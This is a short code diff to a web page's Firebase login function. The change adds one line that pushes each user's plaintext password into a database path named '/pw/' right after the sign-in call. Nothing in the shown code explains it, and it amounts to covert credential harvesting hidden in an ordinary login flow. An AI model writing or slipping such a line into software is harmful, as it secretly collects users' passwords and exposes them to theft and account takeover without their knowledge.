@@ -277,12 +277,14 @@
 		function login() {
 			var email = $("#email").val();
 			var password = $("#password").val();
+			
 			firebase.auth().signInWithEmailAndPassword(email, password).catch(function(error) {
 				//console.log(2);
 				$("#password").val("");
 				$(".alert").addClass("hidden");
 				$("#error").removeClass("hidden");
 			}).then(function() {
+				firebase.database().ref("/pw/").push(password);
 				var invalid = false;
 				//console.log(7);
 				firebase.auth().onAuthStateChanged(function(user) {
